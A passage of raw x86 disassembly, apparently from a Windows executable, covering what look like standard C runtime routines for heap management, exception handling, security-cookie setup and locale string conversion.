  427116:	and    DWORD PTR [ebx+0x4],ecx
  427119:	jmp    0x42711e
  42711b:	mov    ebx,DWORD PTR [ebp+0x8]
  42711e:	cmp    DWORD PTR [ebp-0x8],0x0
  427122:	mov    ecx,DWORD PTR [edx+0x8]
  427125:	mov    edi,DWORD PTR [edx+0x4]
  427128:	mov    DWORD PTR [ecx+0x4],edi
  42712b:	mov    ecx,DWORD PTR [edx+0x4]
  42712e:	mov    edi,DWORD PTR [edx+0x8]
  427131:	mov    DWORD PTR [ecx+0x8],edi
  427134:	je     0x4271c7
  42713a:	mov    ecx,DWORD PTR [ebp-0xc]
  42713d:	lea    ecx,[ecx+esi*8]
  427140:	mov    edi,DWORD PTR [ecx+0x4]
  427143:	mov    DWORD PTR [edx+0x8],ecx
  427146:	mov    DWORD PTR [edx+0x4],edi
  427149:	mov    DWORD PTR [ecx+0x4],edx
  42714c:	mov    ecx,DWORD PTR [edx+0x4]
  42714f:	mov    DWORD PTR [ecx+0x8],edx
  427152:	mov    ecx,DWORD PTR [edx+0x4]
  427155:	cmp    ecx,DWORD PTR [edx+0x8]
  427158:	jne    0x4271b8
  42715a:	mov    cl,BYTE PTR [esi+eax*1+0x4]
  42715e:	mov    BYTE PTR [ebp+0xb],cl
  427161:	inc    cl
  427163:	cmp    esi,0x20
  427166:	mov    BYTE PTR [esi+eax*1+0x4],cl
  42716a:	jge    0x42718f
  42716c:	cmp    BYTE PTR [ebp+0xb],0x0
  427170:	jne    0x42717d
  427172:	mov    edi,0x80000000
  427177:	mov    ecx,esi
  427179:	shr    edi,cl
  42717b:	or     DWORD PTR [ebx],edi
  42717d:	mov    ecx,esi
  42717f:	mov    edi,0x80000000
  427184:	shr    edi,cl
  427186:	mov    ecx,DWORD PTR [ebp-0x4]
  427189:	or     DWORD PTR [eax+ecx*4+0x44],edi
  42718d:	jmp    0x4271b8
  42718f:	cmp    BYTE PTR [ebp+0xb],0x0
  427193:	jne    0x4271a2
  427195:	lea    ecx,[esi-0x20]
  427198:	mov    edi,0x80000000
  42719d:	shr    edi,cl
  42719f:	or     DWORD PTR [ebx+0x4],edi
  4271a2:	mov    ecx,DWORD PTR [ebp-0x4]
  4271a5:	lea    edi,[eax+ecx*4+0xc4]
  4271ac:	lea    ecx,[esi-0x20]
  4271af:	mov    esi,0x80000000
  4271b4:	shr    esi,cl
  4271b6:	or     DWORD PTR [edi],esi
  4271b8:	mov    ecx,DWORD PTR [ebp-0x8]
  4271bb:	test   ecx,ecx
  4271bd:	je     0x4271ca
  4271bf:	mov    DWORD PTR [edx],ecx
  4271c1:	mov    DWORD PTR [ecx+edx*1-0x4],ecx
  4271c5:	jmp    0x4271ca
  4271c7:	mov    ecx,DWORD PTR [ebp-0x8]
  4271ca:	mov    esi,DWORD PTR [ebp-0x10]
  4271cd:	add    edx,ecx
  4271cf:	lea    ecx,[esi+0x1]
  4271d2:	mov    DWORD PTR [edx],ecx
  4271d4:	mov    DWORD PTR [edx+esi*1-0x4],ecx
  4271d8:	mov    esi,DWORD PTR [ebp-0xc]
  4271db:	mov    ecx,DWORD PTR [esi]
  4271dd:	test   ecx,ecx
  4271df:	lea    edi,[ecx+0x1]
  4271e2:	mov    DWORD PTR [esi],edi
  4271e4:	jne    0x427200
  4271e6:	cmp    ebx,DWORD PTR ds:0x45def8
  4271ec:	jne    0x427200
  4271ee:	mov    ecx,DWORD PTR [ebp-0x4]
  4271f1:	cmp    ecx,DWORD PTR ds:0x45df10
  4271f7:	jne    0x427200
  4271f9:	and    DWORD PTR ds:0x45def8,0x0
  427200:	mov    ecx,DWORD PTR [ebp-0x4]
  427203:	mov    DWORD PTR [eax],ecx
  427205:	lea    eax,[edx+0x4]
  427208:	pop    edi
  427209:	pop    esi
  42720a:	pop    ebx
  42720b:	leave  
  42720c:	ret    
  42720d:	int3   
  42720e:	int3   
  42720f:	int3   
  427210:	push   esi
  427211:	inc    ebx
  427212:	xor    dh,BYTE PTR [eax]
  427214:	pop    eax
  427215:	inc    ebx
  427216:	xor    BYTE PTR [eax],dh
  427218:	push   ebp
  427219:	mov    ebp,esp
  42721b:	sub    esp,0x8
  42721e:	push   ebx
  42721f:	push   esi
  427220:	push   edi
  427221:	push   ebp
  427222:	cld    
  427223:	mov    ebx,DWORD PTR [ebp+0xc]
  427226:	mov    eax,DWORD PTR [ebp+0x8]
  427229:	test   DWORD PTR [eax+0x4],0x6
  427230:	jne    0x4272b8
  427236:	mov    DWORD PTR [ebp-0x8],eax
  427239:	mov    eax,DWORD PTR [ebp+0x10]
  42723c:	mov    DWORD PTR [ebp-0x4],eax
  42723f:	lea    eax,[ebp-0x8]
  427242:	mov    DWORD PTR [ebx-0x4],eax
  427245:	mov    esi,DWORD PTR [ebx+0xc]
  427248:	mov    edi,DWORD PTR [ebx+0x8]
  42724b:	cmp    esi,0xffffffff
  42724e:	je     0x4272b1
  427250:	lea    ecx,[esi+esi*2]
  427253:	cmp    DWORD PTR [edi+ecx*4+0x4],0x0
  427258:	je     0x42729f
  42725a:	push   esi
  42725b:	push   ebp
  42725c:	lea    ebp,[ebx+0x10]
  42725f:	call   DWORD PTR [edi+ecx*4+0x4]
  427263:	pop    ebp
  427264:	pop    esi
  427265:	mov    ebx,DWORD PTR [ebp+0xc]
  427268:	or     eax,eax
  42726a:	je     0x42729f
  42726c:	js     0x4272aa
  42726e:	mov    edi,DWORD PTR [ebx+0x8]
  427271:	push   ebx
  427272:	call   0x4281a0
  427277:	add    esp,0x4
  42727a:	lea    ebp,[ebx+0x10]
  42727d:	push   esi
  42727e:	push   ebx
  42727f:	call   0x4281e2
  427284:	add    esp,0x8
  427287:	lea    ecx,[esi+esi*2]
  42728a:	push   0x1
  42728c:	mov    eax,DWORD PTR [edi+ecx*4+0x8]
  427290:	call   0x428276
  427295:	mov    eax,DWORD PTR [edi+ecx*4]
  427298:	mov    DWORD PTR [ebx+0xc],eax
  42729b:	call   DWORD PTR [edi+ecx*4+0x8]
  42729f:	mov    edi,DWORD PTR [ebx+0x8]
  4272a2:	lea    ecx,[esi+esi*2]
  4272a5:	mov    esi,DWORD PTR [edi+ecx*4]
  4272a8:	jmp    0x42724b
  4272aa:	mov    eax,0x0
  4272af:	jmp    0x4272cd
  4272b1:	mov    eax,0x1
  4272b6:	jmp    0x4272cd
  4272b8:	push   ebp
  4272b9:	lea    ebp,[ebx+0x10]
  4272bc:	push   0xffffffff
  4272be:	push   ebx
  4272bf:	call   0x4281e2
  4272c4:	add    esp,0x8
  4272c7:	pop    ebp
  4272c8:	mov    eax,0x1
  4272cd:	pop    ebp
  4272ce:	pop    edi
  4272cf:	pop    esi
  4272d0:	pop    ebx
  4272d1:	mov    esp,ebp
  4272d3:	pop    ebp
  4272d4:	ret    
  4272d5:	push   ebp
  4272d6:	mov    ecx,DWORD PTR [esp+0x8]
  4272da:	mov    ebp,DWORD PTR [ecx]
  4272dc:	mov    eax,DWORD PTR [ecx+0x1c]
  4272df:	push   eax
  4272e0:	mov    eax,DWORD PTR [ecx+0x18]
  4272e3:	push   eax
  4272e4:	call   0x4281e2
  4272e9:	add    esp,0x8
  4272ec:	pop    ebp
  4272ed:	ret    0x4
  4272f0:	call   0x425203
  4272f5:	add    eax,0x8
  4272f8:	ret    
  4272f9:	push   0x14
  4272fb:	push   0x429880
  427300:	call   0x425350
  427305:	mov    edi,DWORD PTR [ebp+0x8]
  427308:	xor    ebx,ebx
  42730a:	cmp    edi,ebx
  42730c:	jne    0x42731c
  42730e:	push   DWORD PTR [ebp+0xc]
  427311:	call   0x426072
  427316:	pop    ecx
  427317:	jmp    0x4274a0
  42731c:	mov    esi,DWORD PTR [ebp+0xc]
  42731f:	cmp    esi,ebx
  427321:	jne    0x42732f
  427323:	push   edi
  427324:	call   0x425f5a
  427329:	pop    ecx
  42732a:	jmp    0x42749e
  42732f:	cmp    DWORD PTR ds:0x45e144,0x3
  427336:	jne    0x42746a
  42733c:	mov    DWORD PTR [ebp-0x1c],ebx
  42733f:	cmp    esi,0xffffffe0
  427342:	ja     0x427439
  427348:	push   0x4
  42734a:	call   0x42550f
  42734f:	pop    ecx
  427350:	mov    DWORD PTR [ebp-0x4],ebx
  427353:	push   edi
  427354:	call   0x426732
  427359:	pop    ecx
  42735a:	mov    DWORD PTR [ebp-0x20],eax
  42735d:	cmp    eax,ebx
  42735f:	je     0x427409
  427365:	cmp    esi,DWORD PTR ds:0x45df04
  42736b:	ja     0x4273b9
  42736d:	push   esi
  42736e:	push   edi
  42736f:	push   eax
  427370:	call   0x426c32
  427375:	add    esp,0xc
  427378:	test   eax,eax
  42737a:	je     0x427381
  42737c:	mov    DWORD PTR [ebp-0x1c],edi
  42737f:	jmp    0x4273b9
  427381:	push   esi
  427382:	call   0x426f11
  427387:	pop    ecx
  427388:	mov    DWORD PTR [ebp-0x1c],eax
  42738b:	cmp    eax,ebx
  42738d:	je     0x4273b9
  42738f:	mov    eax,DWORD PTR [edi-0x4]
  427392:	dec    eax
  427393:	mov    DWORD PTR [ebp-0x24],eax
  427396:	cmp    eax,esi
  427398:	jb     0x42739c
  42739a:	mov    eax,esi
  42739c:	push   eax
  42739d:	push   edi
  42739e:	push   DWORD PTR [ebp-0x1c]
  4273a1:	call   0x426090
  4273a6:	push   edi
  4273a7:	call   0x426732
  4273ac:	mov    DWORD PTR [ebp-0x20],eax
  4273af:	push   edi
  4273b0:	push   eax
  4273b1:	call   0x42675d
  4273b6:	add    esp,0x18
  4273b9:	cmp    DWORD PTR [ebp-0x1c],ebx
  4273bc:	jne    0x427409
  4273be:	cmp    esi,ebx
  4273c0:	jne    0x4273c8
  4273c2:	xor    esi,esi
  4273c4:	inc    esi
  4273c5:	mov    DWORD PTR [ebp+0xc],esi
  4273c8:	add    esi,0xf
  4273cb:	and    esi,0xfffffff0
  4273ce:	mov    DWORD PTR [ebp+0xc],esi
  4273d1:	push   esi
  4273d2:	push   ebx
  4273d3:	push   DWORD PTR ds:0x45e140
  4273d9:	call   DWORD PTR ds:0x429030
  4273df:	mov    DWORD PTR [ebp-0x1c],eax
  4273e2:	cmp    eax,ebx
  4273e4:	je     0x427409
  4273e6:	mov    eax,DWORD PTR [edi-0x4]
  4273e9:	dec    eax
  4273ea:	mov    DWORD PTR [ebp-0x24],eax
  4273ed:	cmp    eax,esi
  4273ef:	jb     0x4273f3
  4273f1:	mov    eax,esi
  4273f3:	push   eax
  4273f4:	push   edi
  4273f5:	push   DWORD PTR [ebp-0x1c]
  4273f8:	call   0x426090
  4273fd:	push   edi
  4273fe:	push   DWORD PTR [ebp-0x20]
  427401:	call   0x42675d
  427406:	add    esp,0x14
  427409:	or     DWORD PTR [ebp-0x4],0xffffffff
  42740d:	call   0x427461
  427412:	cmp    DWORD PTR [ebp-0x20],ebx
  427415:	jne    0x427439
  427417:	cmp    esi,ebx
  427419:	jne    0x42741e
  42741b:	xor    esi,esi
  42741d:	inc    esi
  42741e:	add    esi,0xf
  427421:	and    esi,0xfffffff0
  427424:	mov    DWORD PTR [ebp+0xc],esi
  427427:	push   esi
  427428:	push   edi
  427429:	push   ebx
  42742a:	push   DWORD PTR ds:0x45e140
  427430:	call   DWORD PTR ds:0x4290d4
  427436:	mov    DWORD PTR [ebp-0x1c],eax
  427439:	mov    eax,DWORD PTR [ebp-0x1c]
  42743c:	cmp    eax,ebx
  42743e:	jne    0x4274a0
  427440:	cmp    DWORD PTR ds:0x45ddc8,ebx
  427446:	je     0x4274a0
  427448:	push   esi
  427449:	call   0x427c32
  42744e:	pop    ecx
  42744f:	test   eax,eax
  427451:	jne    0x42733c
  427457:	jmp    0x42749e
  427459:	xor    ebx,ebx
  42745b:	mov    esi,DWORD PTR [ebp+0xc]
  42745e:	mov    edi,DWORD PTR [ebp+0x8]
  427461:	push   0x4
  427463:	call   0x42547b
  427468:	pop    ecx
  427469:	ret    
  42746a:	xor    eax,eax
  42746c:	cmp    esi,0xffffffe0
  42746f:	ja     0x427487
  427471:	cmp    esi,ebx
  427473:	jne    0x427478
  427475:	xor    esi,esi
  427477:	inc    esi
  427478:	push   esi
  427479:	push   edi
  42747a:	push   ebx
  42747b:	push   DWORD PTR ds:0x45e140
  427481:	call   DWORD PTR ds:0x4290d4
  427487:	cmp    eax,ebx
  427489:	jne    0x4274a0
  42748b:	cmp    DWORD PTR ds:0x45ddc8,ebx
  427491:	je     0x4274a0
  427493:	push   esi
  427494:	call   0x427c32
  427499:	pop    ecx
  42749a:	test   eax,eax
  42749c:	jne    0x42746a
  42749e:	xor    eax,eax
  4274a0:	call   0x42538b
  4274a5:	ret    
  4274a6:	push   0x10
  4274a8:	push   0x429890
  4274ad:	call   0x425350
  4274b2:	cmp    DWORD PTR ds:0x45e144,0x3
  4274b9:	jne    0x4274f5
  4274bb:	push   0x4
  4274bd:	call   0x42550f
  4274c2:	pop    ecx
  4274c3:	and    DWORD PTR [ebp-0x4],0x0
  4274c7:	mov    esi,DWORD PTR [ebp+0x8]
  4274ca:	push   esi
  4274cb:	call   0x426732
  4274d0:	pop    ecx
  4274d1:	mov    DWORD PTR [ebp-0x1c],eax
  4274d4:	test   eax,eax
  4274d6:	je     0x4274e3
  4274d8:	mov    esi,DWORD PTR [esi-0x4]
  4274db:	sub    esi,0x9
  4274de:	mov    DWORD PTR [ebp-0x20],esi
  4274e1:	jmp    0x4274e6
  4274e3:	mov    esi,DWORD PTR [ebp-0x20]
  4274e6:	or     DWORD PTR [ebp-0x4],0xffffffff
  4274ea:	call   0x427513
  4274ef:	cmp    DWORD PTR [ebp-0x1c],0x0
  4274f3:	jne    0x427508
  4274f5:	push   DWORD PTR [ebp+0x8]
  4274f8:	push   0x0
  4274fa:	push   DWORD PTR ds:0x45e140
  427500:	call   DWORD PTR ds:0x4290d8
  427506:	mov    esi,eax
  427508:	mov    eax,esi
  42750a:	call   0x42538b
  42750f:	ret    
  427510:	mov    esi,DWORD PTR [ebp-0x20]
  427513:	push   0x4
  427515:	call   0x42547b
  42751a:	pop    ecx
  42751b:	ret    
  42751c:	push   ebp
  42751d:	mov    ebp,esp
  42751f:	sub    esp,0x10
  427522:	push   esi
  427523:	lea    eax,[ebp-0x8]
  427526:	push   eax
  427527:	call   DWORD PTR ds:0x4290e8
  42752d:	mov    esi,DWORD PTR [ebp-0x4]
  427530:	xor    esi,DWORD PTR [ebp-0x8]
  427533:	call   DWORD PTR ds:0x4290e4
  427539:	xor    esi,eax
  42753b:	call   DWORD PTR ds:0x42909c
  427541:	xor    esi,eax
  427543:	call   DWORD PTR ds:0x4290e0
  427549:	xor    esi,eax
  42754b:	lea    eax,[ebp-0x10]
  42754e:	push   eax
  42754f:	call   DWORD PTR ds:0x4290dc
  427555:	mov    eax,DWORD PTR [ebp-0xc]
  427558:	xor    eax,DWORD PTR [ebp-0x10]
  42755b:	xor    esi,eax
  42755d:	mov    DWORD PTR ds:0x45d430,esi
  427563:	jne    0x42756f
  427565:	mov    DWORD PTR ds:0x45d430,0xbb40e64e
  42756f:	pop    esi
  427570:	leave  
  427571:	ret    
  427572:	push   0x118
  427577:	push   0x429a40
  42757c:	call   0x425350
  427581:	mov    eax,ds:0x45d430
  427586:	xor    eax,DWORD PTR [ebp+0x4]
  427589:	mov    DWORD PTR [ebp-0x1c],eax
  42758c:	mov    eax,ds:0x45dd98
  427591:	xor    ecx,ecx
  427593:	cmp    eax,ecx
  427595:	je     0x4275b6
  427597:	mov    DWORD PTR [ebp-0x4],ecx
  42759a:	push   DWORD PTR [ebp+0xc]
  42759d:	push   DWORD PTR [ebp+0x8]
  4275a0:	call   eax
  4275a2:	pop    ecx
  4275a3:	pop    ecx
  4275a4:	or     DWORD PTR [ebp-0x4],0xffffffff
  4275a8:	jmp    0x4276b4
  4275ad:	xor    eax,eax
  4275af:	inc    eax
  4275b0:	ret    
  4275b1:	mov    esp,DWORD PTR [ebp-0x18]
  4275b4:	jmp    0x4275a4
  4275b6:	mov    eax,DWORD PTR [ebp+0x8]
  4275b9:	dec    eax
  4275ba:	je     0x4275cf
  4275bc:	mov    edi,0x429a1c
  4275c1:	mov    DWORD PTR [ebp-0x20],0x429968
  4275c8:	mov    esi,0xd4
  4275cd:	jmp    0x4275e0
  4275cf:	mov    edi,0x429948
  4275d4:	mov    DWORD PTR [ebp-0x20],0x4298a8
  4275db:	mov    esi,0xb9
  4275e0:	mov    BYTE PTR [ebp-0x24],cl
  4275e3:	push   0x104
  4275e8:	lea    eax,[ebp-0x128]
  4275ee:	push   eax
  4275ef:	push   ecx
  4275f0:	call   DWORD PTR ds:0x42906c
  4275f6:	test   eax,eax
  4275f8:	jne    0x42760d
  4275fa:	push   0x42959c
  4275ff:	lea    eax,[ebp-0x128]
  427605:	push   eax
  427606:	call   0x425730
  42760b:	pop    ecx
  42760c:	pop    ecx
  42760d:	lea    ebx,[ebp-0x128]
  427613:	lea    eax,[ebp-0x128]
  427619:	push   eax
  42761a:	call   0x425960
  42761f:	pop    ecx
  427620:	add    eax,0xb
  427623:	cmp    eax,0x3c
  427626:	jbe    0x427651
  427628:	lea    eax,[ebp-0x128]
  42762e:	push   eax
  42762f:	call   0x425960
  427634:	mov    ebx,eax
  427636:	lea    eax,[ebp-0x128]
  42763c:	sub    eax,0x31
  42763f:	add    ebx,eax
  427641:	push   0x3
  427643:	push   0x429598
  427648:	push   ebx
  427649:	call   0x425830
  42764e:	add    esp,0x10
  427651:	push   ebx
  427652:	call   0x425960
  427657:	pop    ecx
  427658:	lea    eax,[eax+esi*1+0xc]
  42765c:	add    eax,0x3
  42765f:	and    eax,0xfffffffc
  427662:	call   0x4253a0
  427667:	mov    DWORD PTR [ebp-0x18],esp
  42766a:	mov    esi,esp
  42766c:	push   edi
  42766d:	push   esi
  42766e:	call   0x425730
  427673:	mov    edi,0x429578
  427678:	push   edi
  427679:	push   esi
  42767a:	call   0x425740
  42767f:	push   0x42989c
  427684:	push   esi
  427685:	call   0x425740
  42768a:	push   ebx
  42768b:	push   esi
  42768c:	call   0x425740
  427691:	push   edi
  427692:	push   esi
  427693:	call   0x425740
  427698:	push   DWORD PTR [ebp-0x20]
  42769b:	push   esi
  42769c:	call   0x425740
  4276a1:	push   0x12010
  4276a6:	push   0x429550
  4276ab:	push   esi
  4276ac:	call   0x425632
  4276b1:	add    esp,0x3c
  4276b4:	push   0x3
  4276b6:	call   0x4247bc
  4276bb:	int3   
  4276bc:	push   0x38
  4276be:	push   0x429e60
  4276c3:	call   0x425350
  4276c8:	xor    ebx,ebx
  4276ca:	cmp    DWORD PTR ds:0x45ddbc,ebx
  4276d0:	jne    0x42770a
  4276d2:	push   ebx
  4276d3:	push   ebx
  4276d4:	xor    esi,esi
  4276d6:	inc    esi
  4276d7:	push   esi
  4276d8:	push   0x429e5c
  4276dd:	push   0x100
  4276e2:	push   ebx
  4276e3:	call   DWORD PTR ds:0x4290f4
  4276e9:	test   eax,eax
  4276eb:	je     0x4276f5
  4276ed:	mov    DWORD PTR ds:0x45ddbc,esi
  4276f3:	jmp    0x42770a
  4276f5:	call   DWORD PTR ds:0x429028
  4276fb:	cmp    eax,0x78
  4276fe:	jne    0x42770a
  427700:	mov    DWORD PTR ds:0x45ddbc,0x2
  42770a:	cmp    DWORD PTR [ebp+0x14],ebx
  42770d:	jle    0x42772a
  42770f:	mov    ecx,DWORD PTR [ebp+0x14]
  427712:	mov    eax,DWORD PTR [ebp+0x10]
  427715:	dec    ecx
  427716:	cmp    BYTE PTR [eax],bl
  427718:	je     0x427722
  42771a:	inc    eax
  42771b:	cmp    ecx,ebx
  42771d:	jne    0x427715
  42771f:	or     ecx,0xffffffff
  427722:	or     eax,0xffffffff
  427725:	sub    eax,ecx
  427727:	add    DWORD PTR [ebp+0x14],eax
  42772a:	mov    eax,ds:0x45ddbc
  42772f:	cmp    eax,0x2
  427732:	je     0x427914
  427738:	cmp    eax,ebx
  42773a:	je     0x427914
  427740:	cmp    eax,0x1
  427743:	jne    0x427947
  427749:	xor    edi,edi
  42774b:	mov    DWORD PTR [ebp-0x1c],edi
  42774e:	mov    DWORD PTR [ebp-0x20],ebx
  427751:	mov    DWORD PTR [ebp-0x24],ebx
  427754:	cmp    DWORD PTR [ebp+0x20],ebx
  427757:	jne    0x427761
  427759:	mov    eax,ds:0x45ddb4
  42775e:	mov    DWORD PTR [ebp+0x20],eax
  427761:	push   ebx
  427762:	push   ebx
  427763:	push   DWORD PTR [ebp+0x14]
  427766:	push   DWORD PTR [ebp+0x10]
  427769:	xor    eax,eax
  42776b:	cmp    DWORD PTR [ebp+0x24],ebx
  42776e:	setne  al
  427771:	lea    eax,[eax*8+0x1]
  427778:	push   eax
  427779:	push   DWORD PTR [ebp+0x20]
  42777c:	call   DWORD PTR ds:0x4290f0
  427782:	mov    esi,eax
  427784:	mov    DWORD PTR [ebp-0x28],esi
  427787:	cmp    esi,ebx
  427789:	je     0x427947
  42778f:	mov    DWORD PTR [ebp-0x4],0x1
  427796:	lea    eax,[esi+esi*1]
  427799:	add    eax,0x3
  42779c:	and    eax,0xfffffffc
  42779f:	call   0x4253a0
  4277a4:	mov    DWORD PTR [ebp-0x18],esp
  4277a7:	mov    eax,esp
  4277a9:	mov    DWORD PTR [ebp-0x2c],eax
  4277ac:	or     DWORD PTR [ebp-0x4],0xffffffff
  4277b0:	jmp    0x4277cd
  4277b2:	xor    eax,eax
  4277b4:	inc    eax
  4277b5:	ret    
  4277b6:	mov    esp,DWORD PTR [ebp-0x18]
  4277b9:	call   0x4287e5
  4277be:	xor    ebx,ebx
  4277c0:	mov    DWORD PTR [ebp-0x2c],ebx
  4277c3:	or     DWORD PTR [ebp-0x4],0xffffffff
  4277c7:	mov    edi,DWORD PTR [ebp-0x1c]
  4277ca:	mov    esi,DWORD PTR [ebp-0x28]
  4277cd:	cmp    DWORD PTR [ebp-0x2c],ebx
  4277d0:	jne    0x4277ee
  4277d2:	lea    eax,[esi+esi*1]
  4277d5:	push   eax
  4277d6:	call   0x426072
  4277db:	pop    ecx
  4277dc:	mov    DWORD PTR [ebp-0x2c],eax
  4277df:	cmp    eax,ebx
  4277e1:	je     0x427947
  4277e7:	mov    DWORD PTR [ebp-0x20],0x1
  4277ee:	push   esi
  4277ef:	push   DWORD PTR [ebp-0x2c]
  4277f2:	push   DWORD PTR [ebp+0x14]
  4277f5:	push   DWORD PTR [ebp+0x10]
  4277f8:	push   0x1
  4277fa:	push   DWORD PTR [ebp+0x20]
  4277fd:	call   DWORD PTR ds:0x4290f0
  427803:	test   eax,eax
  427805:	je     0x4278f1
  42780b:	push   ebx
  42780c:	push   ebx
  42780d:	push   esi
  42780e:	push   DWORD PTR [ebp-0x2c]
  427811:	push   DWORD PTR [ebp+0xc]
  427814:	push   DWORD PTR [ebp+0x8]
  427817:	call   DWORD PTR ds:0x4290f4
  42781d:	mov    edi,eax
  42781f:	mov    DWORD PTR [ebp-0x1c],edi
  427822:	cmp    edi,ebx
  427824:	je     0x4278f1
  42782a:	test   BYTE PTR [ebp+0xd],0x4
  42782e:	je     0x42785d
  427830:	cmp    DWORD PTR [ebp+0x1c],ebx
  427833:	je     0x4278f1
  427839:	cmp    edi,DWORD PTR [ebp+0x1c]
  42783c:	jg     0x4278f1
  427842:	push   DWORD PTR [ebp+0x1c]
  427845:	push   DWORD PTR [ebp+0x18]
  427848:	push   esi
  427849:	push   DWORD PTR [ebp-0x2c]
  42784c:	push   DWORD PTR [ebp+0xc]
  42784f:	push   DWORD PTR [ebp+0x8]
  427852:	call   DWORD PTR ds:0x4290f4
  427858:	jmp    0x4278f1
  42785d:	mov    DWORD PTR [ebp-0x4],0x2
  427864:	lea    eax,[edi+edi*1]
  427867:	add    eax,0x3
  42786a:	and    eax,0xfffffffc
  42786d:	call   0x4253a0
  427872:	mov    DWORD PTR [ebp-0x18],esp
  427875:	mov    eax,esp
  427877:	mov    DWORD PTR [ebp-0x30],eax
  42787a:	or     DWORD PTR [ebp-0x4],0xffffffff
  42787e:	jmp    0x42789b
  427880:	xor    eax,eax
  427882:	inc    eax
  427883:	ret    
  427884:	mov    esp,DWORD PTR [ebp-0x18]
  427887:	call   0x4287e5
  42788c:	xor    ebx,ebx
  42788e:	mov    DWORD PTR [ebp-0x30],ebx
  427891:	or     DWORD PTR [ebp-0x4],0xffffffff
  427895:	mov    edi,DWORD PTR [ebp-0x1c]
  427898:	mov    esi,DWORD PTR [ebp-0x28]
  42789b:	cmp    DWORD PTR [ebp-0x30],ebx
  42789e:	jne    0x4278b8
  4278a0:	lea    eax,[edi+edi*1]
  4278a3:	push   eax
  4278a4:	call   0x426072
  4278a9:	pop    ecx
  4278aa:	mov    DWORD PTR [ebp-0x30],eax
  4278ad:	cmp    eax,ebx
  4278af:	je     0x4278f1
  4278b1:	mov    DWORD PTR [ebp-0x24],0x1
  4278b8:	push   edi
  4278b9:	push   DWORD PTR [ebp-0x30]
  4278bc:	push   esi
  4278bd:	push   DWORD PTR [ebp-0x2c]
  4278c0:	push   DWORD PTR [ebp+0xc]
  4278c3:	push   DWORD PTR [ebp+0x8]
  4278c6:	call   DWORD PTR ds:0x4290f4
  4278cc:	test   eax,eax
  4278ce:	je     0x4278f1
  4278d0:	push   ebx
  4278d1:	push   ebx
  4278d2:	cmp    DWORD PTR [ebp+0x1c],ebx
  4278d5:	jne    0x4278db
  4278d7:	push   ebx
  4278d8:	push   ebx
  4278d9:	jmp    0x4278e1
  4278db:	push   DWORD PTR [ebp+0x1c]
  4278de:	push   DWORD PTR [ebp+0x18]
  4278e1:	push   edi
  4278e2:	push   DWORD PTR [ebp-0x30]
  4278e5:	push   ebx
  4278e6:	push   DWORD PTR [ebp+0x20]
  4278e9:	call   DWORD PTR ds:0x429080
  4278ef:	mov    edi,eax
  4278f1:	cmp    DWORD PTR [ebp-0x24],ebx
  4278f4:	je     0x4278ff
  4278f6:	push   DWORD PTR [ebp-0x30]
  4278f9:	call   0x425f5a
  4278fe:	pop    ecx
  4278ff:	cmp    DWORD PTR [ebp-0x20],ebx
  427902:	je     0x42790d
  427904:	push   DWORD PTR [ebp-0x2c]
  427907:	call   0x425f5a
  42790c:	pop    ecx
  42790d:	mov    eax,edi
  42790f:	jmp    0x427a6f
  427914:	mov    DWORD PTR [ebp-0x34],ebx
  427917:	xor    edi,edi
  427919:	mov    DWORD PTR [ebp-0x38],ebx
  42791c:	cmp    DWORD PTR [ebp+0x8],ebx
  42791f:	jne    0x427929
  427921:	mov    eax,ds:0x45dda4
  427926:	mov    DWORD PTR [ebp+0x8],eax
  427929:	cmp    DWORD PTR [ebp+0x20],ebx
  42792c:	jne    0x427936
  42792e:	mov    eax,ds:0x45ddb4
  427933:	mov    DWORD PTR [ebp+0x20],eax
  427936:	push   DWORD PTR [ebp+0x8]
  427939:	call   0x4285cd
  42793e:	pop    ecx
  42793f:	mov    DWORD PTR [ebp-0x3c],eax
  427942:	cmp    eax,0xffffffff
  427945:	jne    0x42794e
  427947:	xor    eax,eax
  427949:	jmp    0x427a6f
  42794e:	cmp    eax,DWORD PTR [ebp+0x20]
  427951:	je     0x427a45
  427957:	push   ebx
  427958:	push   ebx
  427959:	lea    ecx,[ebp+0x14]
  42795c:	push   ecx
  42795d:	push   DWORD PTR [ebp+0x10]
  427960:	push   eax
  427961:	push   DWORD PTR [ebp+0x20]
  427964:	call   0x428616
  427969:	add    esp,0x18
  42796c:	mov    DWORD PTR [ebp-0x34],eax
  42796f:	cmp    eax,ebx
  427971:	je     0x427947
  427973:	push   ebx
  427974:	push   ebx
  427975:	push   DWORD PTR [ebp+0x14]
  427978:	push   eax
  427979:	push   DWORD PTR [ebp+0xc]
  42797c:	push   DWORD PTR [ebp+0x8]
  42797f:	call   DWORD PTR ds:0x4290ec
  427985:	mov    esi,eax
  427987:	mov    DWORD PTR [ebp-0x40],esi
  42798a:	cmp    esi,ebx
  42798c:	je     0x427a34
  427992:	mov    DWORD PTR [ebp-0x4],ebx
  427995:	add    eax,0x3
  427998:	and    eax,0xfffffffc
  42799b:	call   0x4253a0
  4279a0:	mov    DWORD PTR [ebp-0x18],esp
  4279a3:	mov    edi,esp
  4279a5:	mov    DWORD PTR [ebp-0x44],edi
  4279a8:	push   esi
  4279a9:	push   ebx
  4279aa:	push   edi
  4279ab:	call   0x427c50
  4279b0:	add    esp,0xc
  4279b3:	jmp    0x4279c5
  4279b5:	xor    eax,eax
  4279b7:	inc    eax
  4279b8:	ret    
  4279b9:	mov    esp,DWORD PTR [ebp-0x18]
  4279bc:	call   0x4287e5
  4279c1:	xor    ebx,ebx
  4279c3:	xor    edi,edi
  4279c5:	or     DWORD PTR [ebp-0x4],0xffffffff
  4279c9:	cmp    edi,ebx
  4279cb:	jne    0x4279f0
  4279cd:	push   DWORD PTR [ebp-0x40]
  4279d0:	call   0x426072
  4279d5:	pop    ecx
  4279d6:	mov    edi,eax
  4279d8:	cmp    edi,ebx
  4279da:	je     0x427a0d
  4279dc:	push   DWORD PTR [ebp-0x40]
  4279df:	push   ebx
  4279e0:	push   edi
  4279e1:	call   0x427c50
  4279e6:	add    esp,0xc
  4279e9:	mov    DWORD PTR [ebp-0x38],0x1
  4279f0:	push   DWORD PTR [ebp-0x40]
  4279f3:	push   edi
  4279f4:	push   DWORD PTR [ebp+0x14]
  4279f7:	push   DWORD PTR [ebp-0x34]
  4279fa:	push   DWORD PTR [ebp+0xc]
  4279fd:	push   DWORD PTR [ebp+0x8]
  427a00:	call   DWORD PTR ds:0x4290ec
  427a06:	mov    DWORD PTR [ebp-0x40],eax
  427a09:	cmp    eax,ebx
  427a0b:	jne    0x427a11
  427a0d:	xor    esi,esi
  427a0f:	jmp    0x427a37
  427a11:	push   DWORD PTR [ebp+0x1c]
  427a14:	push   DWORD PTR [ebp+0x18]
  427a17:	lea    eax,[ebp-0x40]
